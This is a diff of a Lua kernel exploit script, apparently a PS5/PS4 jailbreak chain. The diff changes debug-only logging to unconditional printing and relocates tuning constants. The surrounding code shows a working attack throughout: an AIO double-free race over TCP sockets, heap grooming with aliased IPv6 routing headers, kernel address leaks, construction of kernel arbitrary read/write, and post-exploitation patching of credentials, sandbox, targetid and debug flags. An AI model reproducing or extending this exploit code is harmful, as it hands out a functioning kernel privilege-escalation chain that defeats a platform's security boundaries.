@@ -35,32 +35,32 @@ syscall.resolve({
 
 
 
+-- configuration
 
-DEBUG = true
+MAIN_CORE = 4
+MAIN_RTPRIO = 0x100
+
+NUM_WORKERS = 2
+NUM_GROOMS = 0x200
+NUM_HANDLES = 0x100
+NUM_RACES = 100
+NUM_SDS = 64
+NUM_SDS_ALT = 48
+NUM_ALIAS = 100
+LEAK_LEN = 16
+NUM_LEAKS = 16
+NUM_CLOBBERS = 8
+
 
 
 
 -- misc functions
-
-function dbg(s)
-    if DEBUG then
-        print(s)
-    end
-end
-
-function dbgf(...)
-    if DEBUG then
-        dbg(string.format(...))
-    end
-end
 
 function wait_for(addr, threshold)
     while memory.read_qword(addr):tonumber() ~= threshold do
         sleep(1, "ns")
     end
 end
-
-
 
 
 
@@ -115,6 +115,9 @@ end
 function get_rtprio()
     return rtprio(RTP_LOOKUP)
 end
+
+
+
 
 -- rop functions
 
@@ -298,22 +301,6 @@ AIO_CMD_MULTI_READ = bit32.bor(AIO_CMD_FLAG_MULTI, AIO_CMD_READ)
 AIO_STATE_COMPLETE = 3
 AIO_STATE_ABORTED = 4
 
-
-MAIN_CORE = 4
-MAIN_RTPRIO = 0x100
-
-NUM_WORKERS = 2
-NUM_GROOMS = 0x200
-NUM_HANDLES = 0x100
-NUM_RACES = 100
-NUM_SDS = 64
-NUM_SDS_ALT = 48
-NUM_ALIAS = 100
-LEAK_LEN = 16
-NUM_LEAKS = 16
-NUM_CLOBBERS = 8
-
-
 -- max number of requests that can be created/polled/canceled/deleted/waited
 MAX_AIO_IDS = 0x80
 
@@ -324,8 +311,6 @@ AIO_ERRORS = memory.alloc(4 * MAX_AIO_IDS)
 
 
 SCE_KERNEL_ERROR_ESRCH = 0x80020003
-
-
 
 
 -- multi aio related functions
@@ -656,22 +641,22 @@ function race_one(request_addr, tcp_sd, sds)
     local suspend_res = memory.read_qword(suspend_chain.retval_addr[1]):tonumber()
 
     -- local suspend_res = syscall.thr_suspend_ucontext(thr_tid):tonumber()
-    dbgf("suspend %s: %d", hex(thr_tid), suspend_res)
+    printf("suspend %s: %d", hex(thr_tid), suspend_res)
 
     local poll_err = memory.alloc(4)
     aio_multi_poll(request_addr, 1, poll_err)
     local poll_res = memory.read_dword(poll_err):tonumber()
-    dbgf("poll: %s", hex(poll_res))
+    printf("poll: %s", hex(poll_res))
 
     local info_buf = memory.alloc(0x100)
     local info_size = gsockopt(tcp_sd, IPPROTO_TCP, TCP_INFO, info_buf, 0x100)
 
     if info_size ~= size_tcp_info then
-        dbgf("info size isn't " .. size_tcp_info .. ": " .. info_size)
+        printf("info size isn't " .. size_tcp_info .. ": " .. info_size)
     end
 
     local tcp_state = memory.read_byte(info_buf):tonumber()
-    dbg("tcp state: " .. hex(tcp_state))
+    print("tcp state: " .. hex(tcp_state))
 
     local won_race = false
 
@@ -685,7 +670,7 @@ function race_one(request_addr, tcp_sd, sds)
 
     -- resume the worker thread
     local resume = syscall.thr_resume_ucontext(thr_tid):tonumber()
-    dbgf("resume %s: %d", hex(thr_tid), resume)
+    printf("resume %s: %d", hex(thr_tid), resume)
 
     wait_for(deletion_signal, 1)
 
@@ -693,7 +678,7 @@ function race_one(request_addr, tcp_sd, sds)
 
         local err_main_thr = memory.read_dword(sce_errs)
         local err_worker_thr = memory.read_dword(sce_errs+4)
-        dbgf("sce_errs: %s %s", hex(err_main_thr), hex(err_worker_thr))
+        printf("sce_errs: %s %s", hex(err_main_thr), hex(err_worker_thr))
 
         -- if the code has no bugs then this isn't possible but we keep the check for easier debugging
         -- NOTE: both must be equal 0 for the double free to works
@@ -759,7 +744,7 @@ function make_aliased_rthdrs(sds)
         for i=1, NUM_SDS do
             get_rthdr(sds[i], buf, size)
             local marker = memory.read_dword(buf + marker_offset):tonumber()
-            -- dbgf("loop[%d] -- sds[%d] = %s", loop, i, hex(marker))
+            -- printf("loop[%d] -- sds[%d] = %s", loop, i, hex(marker))
             if marker ~= i then
                 local sd_pair = { sds[i], sds[marker] }
                 printf("aliased rthdrs at attempt: %d (found pair: %d %d)", loop, sd_pair[1], sd_pair[2])
@@ -801,7 +786,7 @@ function double_free_reqs2(sds)
     memory.write_dword(server_addr + 4, aton("127.0.0.1"))
 
     local sd_listen = new_tcp_socket()
-    dbgf("sd_listen: %d", sd_listen)
+    printf("sd_listen: %d", sd_listen)
 
     local enable = memory.alloc(4)
     memory.write_dword(enable, 1)
@@ -828,7 +813,7 @@ function double_free_reqs2(sds)
     for i=1,NUM_RACES do
 
         local sd_client = new_tcp_socket()
-        dbgf("sd_client: %d", sd_client)
+        printf("sd_client: %d", sd_client)
 
         if syscall.connect(sd_client, server_addr, 16):tonumber() == -1 then
             error("connect() error: " .. get_error_string())
@@ -839,7 +824,7 @@ function double_free_reqs2(sds)
             error("accept() error: " .. get_error_string())
         end
 
-        dbgf("sd_conn: %d", sd_conn)
+        printf("sd_conn: %d", sd_conn)
 
         local linger_buf = memory.alloc(8)
         memory.write_dword(linger_buf, 1) -- l_onoff - linger active
@@ -1139,13 +1124,13 @@ function leak_kernel_addrs(sd_pair, sds)
         error("could not leak reqs2 and fake reqs3")
     end
 
-    dbgf("reqs2 offset: %s", hex(reqs2_off))
-    dbgf("fake reqs3 offset: %s", hex(fake_reqs3_off))
+    printf("reqs2 offset: %s", hex(reqs2_off))
+    printf("fake reqs3 offset: %s", hex(fake_reqs3_off))
 
     get_rthdr(sd, buf, buflen)
 
-    dbg("leaked aio_entry:")
-    dbg(memory.hex_dump(buf + reqs2_off, 0x80))
+    print("leaked aio_entry:")
+    print(memory.hex_dump(buf + reqs2_off, 0x80))
 
     -- store for curproc leak later
     local aio_info_addr = memory.read_qword(buf + reqs2_off + 0x18)
@@ -1159,7 +1144,7 @@ function leak_kernel_addrs(sd_pair, sds)
     printf("reqs1_addr = %s", hex(reqs1_addr))
     printf("fake_reqs3_addr = %s", hex(fake_reqs3_addr))
 
-    dbg("searching target_id")
+    print("searching target_id")
 
     local target_id = nil
     local to_cancel = nil
@@ -1248,7 +1233,7 @@ function double_free_reqs1(reqs1_addr, target_id, evf, sd, sds, sds_alt, fake_re
     local aio_ids_len = num_batches * num_elems
     local aio_ids = memory.alloc(4 * aio_ids_len)
 
-    dbg("start overwrite rthdr with AIO queue entry loop")
+    print("start overwrite rthdr with AIO queue entry loop")
     local aio_not_found = true
     free_evf(evf)
 
@@ -1287,7 +1272,7 @@ function double_free_reqs1(reqs1_addr, target_id, evf, sd, sds, sds_alt, fake_re
         table.insert(addr_cache, aio_ids + bit32.lshift(i * num_elems, 2))
     end
 
-    dbg("start overwrite AIO queue entry with rthdr loop")
+    print("start overwrite AIO queue entry with rthdr loop")
 
     syscall.close(sd)
     sd = nil
@@ -1319,18 +1304,18 @@ function double_free_reqs1(reqs1_addr, target_id, evf, sd, sds, sds_alt, fake_re
 
                 if req_idx ~= -1 then
 
-                    dbgf("states[%d] = %s", req_idx, hex(memory.read_dword(states + req_idx*4)))
-                    dbgf("found req_id at batch: %s", batch)
+                    printf("states[%d] = %s", req_idx, hex(memory.read_dword(states + req_idx*4)))
+                    printf("found req_id at batch: %s", batch)
                     printf("aliased at attempt: %d", i)
 
                     local aio_idx = (batch-1) * num_elems + req_idx
                     local req_id_p = aio_ids + aio_idx*4
                     local req_id = memory.read_dword(req_id_p):tonumber()
                     
-                    dbgf("req_id = %s", hex(req_id))
+                    printf("req_id = %s", hex(req_id))
 
                     aio_multi_poll(req_id_p, 1, states)
-                    dbgf("states[%d] = %s", req_idx, hex(memory.read_dword(states)))
+                    printf("states[%d] = %s", req_idx, hex(memory.read_dword(states)))
                     memory.write_dword(req_id_p, 0)
 
                     return req_id
@@ -1380,13 +1365,13 @@ function double_free_reqs1(reqs1_addr, target_id, evf, sd, sds, sds_alt, fake_re
 
     local err1 = memory.read_dword(sce_errs):tonumber()
     local err2 = memory.read_dword(sce_errs+4):tonumber()
-    dbgf("delete errors: %s %s", hex(err1), hex(err2))
+    printf("delete errors: %s %s", hex(err1), hex(err2))
 
     memory.write_dword(states, -1)
     memory.write_dword(states+4, -1)
 
     aio_multi_poll(target_ids, 2, states)
-    dbgf("target states: %s %s", hex(memory.read_dword(states)), hex(memory.read_dword(states+4)))
+    printf("target states: %s %s", hex(memory.read_dword(states)), hex(memory.read_dword(states+4)))
 
     local success = true
     if memory.read_dword(states):tonumber() ~= SCE_KERNEL_ERROR_ESRCH then
@@ -1428,7 +1413,7 @@ function make_kernel_arw(pktopts_sds, k100_addr, kernel_addr, sds, sds_alt, aio_
     -- pktopts.ip6po_pktinfo = &pktopts.ip6po_pktinfo
     memory.write_qword(pktopts + 0x10, pktinfo_p)
 
-    dbg("overwrite main pktopts")
+    print("overwrite main pktopts")
     local reclaim_sock = nil
 
     syscall.close(pktopts_sds[2])
@@ -1488,9 +1473,9 @@ function make_kernel_arw(pktopts_sds, k100_addr, kernel_addr, sds, sds_alt, aio_
         return memory.read_qword(read_buf)
     end
 
-    dbgf("slow_kread8(&\"evf cv\"): %s", hex(slow_kread8(kernel_addr)))
+    printf("slow_kread8(&\"evf cv\"): %s", hex(slow_kread8(kernel_addr)))
     local kstr = memory.read_null_terminated_string(read_buf)
-    dbgf("*(&\"evf cv\"): %s", kstr)
+    printf("*(&\"evf cv\"): %s", kstr)
 
     if kstr ~= "evf cv" then
         error("test read of &\"evf cv\" failed")
@@ -1743,7 +1728,7 @@ function post_exploitation_ps5()
         local uid_before = syscall.getuid():tonumber()
         local in_sandbox_before = syscall.is_in_sandbox():tonumber()
 
-        dbgf("patching curproc %s (authid = %s)", hex(proc), hex(authid))
+        printf("patching curproc %s (authid = %s)", hex(proc), hex(authid))
 
         patch_ucred(ucred, authid)
         patch_dynlib_restriction(proc)
@@ -1764,16 +1749,16 @@ function post_exploitation_ps5()
         local utoken_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_UTOKEN_FLAGS
 
         -- Set security flags
-        dbg("setting security flags")
+        print("setting security flags")
         local security_flags = accessor.read_dword(security_flags_addr)
         accessor.write_dword(security_flags_addr, bit64.bor(security_flags, 0x14))
 
         -- Set targetid to DEX
-        dbg("setting targetid")
+        print("setting targetid")
         accessor.write_byte(target_id_flags_addr, 0x82)
 
         -- Set qa flags and utoken flags for debug menu enable
-        dbg("setting qa flags and utoken flags")
+        print("setting qa flags and utoken flags")
         local qa_flags = accessor.read_dword(qa_flags_addr)
         accessor.write_dword(qa_flags_addr, bit64.bor(qa_flags, 0x10300))
 
@@ -1838,7 +1823,7 @@ function kexploit()
     local block_fd = memory.read_dword(sockpair):tonumber()
     local unblock_fd = memory.read_dword(sockpair + 4):tonumber()
 
-    dbgf("block_fd %d unblocked_fd %d", block_fd, unblock_fd)
+    printf("block_fd %d unblocked_fd %d", block_fd, unblock_fd)
 
     -- NOTE: on game process, only < 130? sockets can be created, otherwise we'll hit limit error
     for i=1, NUM_SDS do
